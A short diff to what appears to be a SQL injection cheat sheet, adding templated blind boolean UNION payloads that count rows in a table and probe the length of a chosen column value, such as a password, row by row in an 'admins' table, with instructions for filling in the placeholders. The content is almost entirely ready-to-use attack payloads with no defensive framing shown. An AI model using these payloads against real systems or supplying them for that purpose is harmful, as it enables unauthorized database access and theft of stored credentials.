@@ -31,3 +31,12 @@
 
 - Dump the number of rows in a table:
 ' UNION SELECT 1 WHERE (SELECT COUNT(*) FROM {table_name}) = {row_count}-- -
+
+
+
+2. Dump the Length of the Column Value for a Specific Row
+For row {row_index}, determine the length of the value in {column_name}:
+' UNION SELECT 1 WHERE (SELECT LENGTH({column_name}) FROM admins LIMIT {row_index},1) = {length}-- -
+Replace {column_name} with the column name you want to target (e.g., password).
+Replace {row_index} with the index of the row (0 for the first row, 1 for the second, etc.).
+Replace {length} with the length you want to test.
